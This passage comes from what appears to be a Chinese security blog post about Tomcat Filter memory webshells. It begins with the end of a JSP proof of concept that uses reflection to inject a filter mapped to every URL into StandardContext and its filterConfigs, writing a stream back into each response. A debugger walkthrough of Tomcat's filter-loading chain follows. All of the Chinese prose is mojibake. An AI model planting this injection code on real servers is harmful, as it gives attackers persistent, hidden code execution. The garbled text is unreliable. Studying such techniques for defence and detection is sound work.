</span></span><span class="line"><span class="cl">        PrintWriter writer = response.getWriter();
</span></span><span class="line"><span class="cl">        String line;
</span></span><span class="line"><span class="cl">        while ((line = reader.readLine())!= null) {
</span></span><span class="line"><span class="cl">          writer.write(line + &#34;\n&#34;);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        // å…³é—­ç›¸å…³èµ„æº
</span></span><span class="line"><span class="cl">        reader.close();
</span></span><span class="line"><span class="cl">        inputStream.close();
</span></span><span class="line"><span class="cl">        writer.close();
</span></span><span class="line"><span class="cl">        chain.doFilter(request, response);
</span></span><span class="line"><span class="cl">      } catch (Exception e) {
</span></span><span class="line"><span class="cl">        throw new RuntimeException(e);
</span></span><span class="line"><span class="cl">      }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">  };
</span></span><span class="line"><span class="cl">  FilterDef filterDef = new FilterDef();
</span></span><span class="line"><span class="cl">  myFilter myFilter = new myFilter();
</span></span><span class="line"><span class="cl">  filterDef.setFilter(myFilter);
</span></span><span class="line"><span class="cl">  filterDef.setFilterName(&#34;myFilter&#34;);
</span></span><span class="line"><span class="cl">  FilterMap filterMap = new FilterMap();
</span></span><span class="line"><span class="cl">  filterMap.setFilterName(&#34;myFilter&#34;);
</span></span><span class="line"><span class="cl">  filterMap.addURLPattern(&#34;/*&#34;);
</span></span><span class="line"><span class="cl">  Standardcontext1.addFilterDef(filterDef);
</span></span><span class="line"><span class="cl">  Standardcontext1.addFilterMap(filterMap);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Field filterConfigs = Standardcontext1.getClass().getDeclaredField(&#34;filterConfigs&#34;);
</span></span><span class="line"><span class="cl">  filterConfigs.setAccessible(true);
</span></span><span class="line"><span class="cl">  Map map = (Map) filterConfigs.get(Standardcontext1);
</span></span><span class="line"><span class="cl">  Class&lt;?&gt; aClass = Class.forName(&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;);
</span></span><span class="line"><span class="cl">  Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Context.class, FilterDef.class);
</span></span><span class="line"><span class="cl">  declaredConstructor.setAccessible(true);
</span></span><span class="line"><span class="cl">  ApplicationFilterConfig myconfig = (ApplicationFilterConfig) declaredConstructor.newInstance(Standardcontext1, filterDef);
</span></span><span class="line"><span class="cl">  map.put(&#34;myFilter&#34;, myconfig);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  out.println(1111111);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></div><h1 id="0x02-åˆ†ææµç¨‹">0x02 åˆ†ææµç¨‹<a hidden class="anchor" aria-hidden="true" href="#0x02-åˆ†ææµç¨‹">#</a></h1>
<p>å…ˆé€šè¿‡è¿™ä¸ªdemoï¼Œè°ƒè¯•åˆ†æï¼Œçœ‹ä»€ä¹ˆåœ°æ–¹è°ƒè¯•æˆ‘ä»¬çš„doFilter</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.learnservlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebFilter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebFilter</span><span class="p">(</span><span class="n">filterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;TestFilter&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">urlPatterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/test/*&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;filter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20241031185122265.png" alt="image-20241031185122265"  />
</p>
<p>å’Œlistenerä¸€æ ·çš„æ€è·¯çš„è¯ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ˜¯è¦æ·»åŠ æ¶æ„filteråˆ°filtersé‡Œ</p>
<p><img loading="lazy" src="images/image-20241031185153489.png" alt="image-20241031185153489"  />
</p>
<p>ç„¶åæˆ‘ä»¬æ‰¾åˆ°addFilterï¼Œé€šè¿‡æ ˆï¼Œæˆ‘ä»¬å‘ç°æ¯æ¬¡è¯·æ±‚<code>ApplicationFilterFactory</code>éƒ½ä¼šè°ƒç”¨<code>ApplicationFilterChain.addFilter()</code>æ–¹æ³•</p>
<p><img loading="lazy" src="images/image-20241031185728210.png" alt="image-20241031185728210"  />
</p>
<p>è¿™é‡Œæˆ‘ä»¬å¾€ä¸ŠæŸ¥çœ‹</p>
<p><img loading="lazy" src="images/image-20241031185945001.png" alt="image-20241031185945001"  />
</p>
<p><code>filterMaps</code>å®é™…æ¥è‡ªStandardContextï¼ŒæŸ¥çœ‹findFilterMapsæ–¹æ³•ï¼Œå‘ç°<code>filterMaps</code></p>
<p><img loading="lazy" src="images/image-20241031190008043.png" alt="image-20241031190008043"  />
</p>
<p><img loading="lazy" src="images/image-20241031190100554.png" alt="image-20241031190100554"  />
</p>
<p>ç„¶åæˆ‘ä»¬çœ‹åˆ°addFilterMapæ–¹æ³•ï¼Œè¿™é‡Œå°±æƒ³åˆ°æˆ‘ä»¬è·å¾—<code>StandardContext</code>å®ä¾‹åè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ’å…¥filterï¼Œä¸ä¹…è¡Œäº†å˜›</p>
<p><img loading="lazy" src="images/image-20241031190309711.png" alt="image-20241031190309711"  />
</p>
<p>ä½†è¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹<code>filterMaps</code>å¹¶æ²¡æœ‰æˆ‘ä»¬çš„<code>Filterç±»å±æ€§</code>ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆä¼ å…¥æˆ‘ä»¬çš„<code>Filterå®ä¾‹</code>å‘¢</p>
<p><img loading="lazy" src="images/image-20241031190602043.png" alt="image-20241031190602043"  />
</p>
<p>ç„¶åçœ‹è°ƒç”¨æ ˆå¾€ä¸Šçœ‹åˆ°åœ¨è°ƒç”¨<code>addFilterMap</code>æ–¹æ³•å‰ä¼šå…ˆè°ƒç”¨<code>addFilterDef</code>æ–¹æ³•</p>
<p><img loading="lazy" src="images/image-20241031190750854.png" alt="image-20241031190750854"  />
</p>
<p><img loading="lazy" src="images/image-20241031190909633.png" alt="image-20241031190909633"  />
</p>
<p>è¿™é‡Œå»FilterDefå»æŸ¥æ‰¾ä¸€ç•ªï¼Œå‘ç°æœ‰è®¾ç½®Filterï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å¤šåŠæ˜¯ä¼ å…¥Filterçš„åœ°æ–¹äº†</p>
<p><img loading="lazy" src="images/image-20241031190845594.png" alt="image-20241031190845594"  />
</p>
<p>ä½†æ˜¯æœ€åè°ƒç”¨çš„<code>filterMaps</code>å’Œ<code>FilterDef</code>æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œå…¶å®filteræ›´åƒå­˜å‚¨FilteråŸºæœ¬ä¿¡æ¯ï¼ˆFilteråå­—ï¼Œurlï¼‰ç­‰ï¼Œè€ŒFilterDefåˆ™å‚¨å­˜<code>Filteråå­—</code>å¯¹åº”çš„<code>Filterå®ä¾‹</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">filterDefs.put(filterDef.getFilterName(), filterDef);
</span></span></code></pre></div><p>è¿™é‡Œputï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>Filteråå­—</code>ã€‚</p>
<p>ç„¶åé€šè¿‡å…¶ä»–demoFilterçš„æˆ‘ä»¬å¤§æ¦‚ä¹ŸçŸ¥é“filterMapsè¦è®¾ç½®ä»€ä¹ˆå€¼ï¼ˆFilteråå­—ï¼Œurlï¼‰</p>
<p>ç„¶åå°è¯•æ„é€ pocï¼Œæœ€åå†™å…¥filterä»£ç é•¿è¿™æ ·</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">myFilter</span><span class="w"> </span><span class="n">myFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">myFilter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">myFilter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&#34;myFilter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&#34;myFilter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Standardcontext1</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Standardcontext1</span><span class="p">.</span><span class="na">addFilterMap</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>è¿è¡Œåï¼Œæ‰§è¡Œå‘ç°æ²¡ååº”ï¼Œè°ƒè¯•å‘ç°æ¼äº†ä¸€å¤„åœ°æ–¹</p>
<p><img loading="lazy" src="images/image-20241031191926583.png" alt="image-20241031191926583"  />
</p>
<p>è¿™é‡Œæˆ‘çš„filterMapså·²ç»æœ‰æˆ‘è‡ªå·±çš„filterMapäº†ï¼Œä½†æ˜¯æ‰§è¡Œæˆ‘çš„filterMapæ—¶è¿›å…¥äº†æœ€åè¿™ä¸ªcontinue</p>
<p>å‘ç°filterConfigæ²¡æœ‰å€¼ï¼Œèµ·åˆæ²¡ç»†çœ‹è¿™é‡Œï¼Œä»¥ä¸ºè¿™é‡Œæ˜¯ç”¨æ¥å°è£…çš„ï¼Œåˆ°filterMapæ„é€ å°±èƒ½æˆåŠŸæ‰§è¡Œã€‚</p>
<p>å€’å›æ¥æˆ‘ä»¬è·Ÿè¿›<strong>findFilterConfig</strong>æ–¹æ³•ï¼Œç„¶åå†æŸ¥çœ‹<code>filterConfigs</code>å“ªäº›åœ°æ–¹è°ƒç”¨è¿‡</p>
<p><img loading="lazy" src="images/image-20241031192228133.png" alt="image-20241031192228133"  />
</p>
<p>æŸ¥çœ‹å®Œï¼Œå‘ç°ä¹Ÿåªæœ‰**filterStart()**æ–¹æ³•è¿™é‡Œè¿›è¡Œè¿‡èµ‹å€¼</p>
<p><img loading="lazy" src="images/image-20241031192437153.png" alt="image-20241031192437153"  />
</p>
<p>çœ‹åˆ°è¿™ï¼Œæ€è·¯ä¹Ÿæ¸…æ™°äº†ï¼Œå°±æ˜¯åå°„è·å–filterConfigså†putä¸€ä¸ª<code>ApplicationFilterConfig</code>ï¼ŒæŸ¥çœ‹è‡ªæ„æ–¹æ³•å‚æ•°ï¼Œç„¶åä¸æ˜¯publicï¼Œè¿™ä¸ªæ„é€ æ–¹æ³•ä¹Ÿè¦é€šè¿‡åå°„ç„¶åå®ä¾‹åŒ–</p>
<p><img loading="lazy" src="images/image-20241031192654369.png" alt="image-20241031192654369"  />
</p>
<p>Filterä¼ å‚å¸¦æœ‰responseï¼Œä¸ç”¨è€ƒè™‘è·å–ï¼ŒservletContextå’ŒListenerä¸€æ ·çš„è·å–æ–¹å¼ï¼Œç„¶åå°±å¯ä»¥å®Œæ•´pocå•¦</p>
<p><strong>Filter çš„åŠ è½½æµç¨‹å¦‚ä¸‹</strong></p>
<blockquote>
<ol>
<li>é€šè¿‡ ApplicationFilterFactory.createFilterChain() åˆ›å»º FilterChain</li>
<li>è°ƒç”¨ StandardContext.findFilterMaps() å¾—åˆ° filterMaps</li>
<li>éå† filterMaps, ä¾æ¬¡ä» StandardContext ä¸­ç”¨ filterMap.getFilterName() è·å–å¯¹åº”çš„ filterConfig, å¹¶å°†å…¶æ”¾å…¥ FilterChain</li>
<li>æ‰§è¡Œ FilterChain.doFilter() å¹¶åœ¨å†…éƒ¨è°ƒç”¨ internalDoFilter æ–¹æ³•</li>
<li>ä¾æ¬¡æ‰§è¡Œ filterConfig.getFilter() è·å– Filter å®ä¾‹, å¹¶æœ€ç»ˆè°ƒç”¨å…¶ doFilter æ–¹æ³•</li>
</ol>
</blockquote>
<p>æ„Ÿè§‰è‡ªå·±ç¬¬ä¸€æ¬¡å†™ï¼Œæœ‰äº›æ½¦è‰ï¼Œä¹Ÿä¸æƒ³å¤§æ”¹äº†ï¼ˆæ‡’ï¼‰</p>
<h1 id="0x03-è¡¥å……">0x03 è¡¥å……<a hidden class="anchor" aria-hidden="true" href="#0x03-è¡¥å……">#</a></h1>
<p>è¿™é‡Œè¡¥å……ä¸‹æµç¨‹ï¼Œç›´æ¥å€Ÿç”¨å…¶ä»–å¤§ä½¬çš„å›¾äº†</p>
<blockquote>
<p>è°ƒç”¨æ ˆ</p>
</blockquote>
<p><img loading="lazy" src="images/202211042024305.png" alt="https://img.exp10it.io/img/202211042024305.png"  />
</p>
<p>ç›´æ¥è·³è½¬åˆ° StandardWrapperValve<img loading="lazy" src="images/202211042026953.png" alt="https://img.exp10it.io/img/202211042026953.png"  />
</p>
<p>æ‰§è¡Œäº† filterChain.doFilter æ–¹æ³•, ç»§ç»­è·Ÿè¿›</p>
<p><img loading="lazy" src="images/202211042028133.png" alt="https://img.exp10it.io/img/202211042028133.png"  />
</p>
<p>ç„¶åæˆ‘ä»¬å›åˆ° StandardWrapperValve, å¾€å‰é¢ç¿»ç¿»çœ‹è¿™ä¸ª filterChain æ˜¯æ€ä¹ˆæ¥çš„</p>
<p><img loading="lazy" src="images/202211042027120.png" alt="https://img.exp10it.io/img/202211042027120.png"  />
</p>
<p>è¿™é‡Œé€šè¿‡ ApplicationFilterFactory.createFilterChain() åˆ›å»º filterChain</p>
<p>éœ€è¦æ³¨æ„åˆ›å»ºè¿‡ç¨‹æ˜¯åŠ¨æ€çš„, å³æˆ‘ä»¬æ¯å‘èµ·ä¸€æ¬¡è¯·æ±‚, tomcat éƒ½ä¼šæ‰§è¡Œä¸€é createFilterChain, è¿™ä¹Ÿä¸ºåé¢å†…å­˜é©¬çš„æ¤å…¥åšäº†é“ºå«</p>
<p>è·Ÿè¿› createFilterChain æ–¹æ³•</p>
<p><img loading="lazy" src="images/202211042040708.png" alt="https://img.exp10it.io/img/202211042040708.png"  />
</p>
<p>é¦–å…ˆä» Request å¯¹è±¡ä¸­è·å– filterChain, å¦‚æœ filterChain ä¸å­˜åœ¨, å°±è‡ªå·±æ–°å»ºä¸€ä¸ª, å†è®¾ç½®åˆ° req å†…</p>
<p><img loading="lazy" src="images/202211042043731.png" alt="https://img.exp10it.io/img/202211042043731.png"  />
</p>
<p>ç„¶åä» wrapper ä¸­è·å– StandardContext å¯¹è±¡, å¹¶ä¸”è°ƒç”¨ findFilterMaps æ–¹æ³•å¾—åˆ° filterMaps</p>
<p><img loading="lazy" src="images/202211042045782.png" alt="https://img.exp10it.io/img/202211042045782.png"  />
</p>
<p>æœ€åéå† filterMaps, é€šè¿‡ filterMap.getFilterName() ä» context ä¸­å¯»æ‰¾å¯¹åº”çš„ FilterConfig å¹¶ä¸”æ·»åŠ è‡³ filterChain</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>Commons-Collections1-7</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-listener%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>Tomcat Listenerå†…å­˜é©¬</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
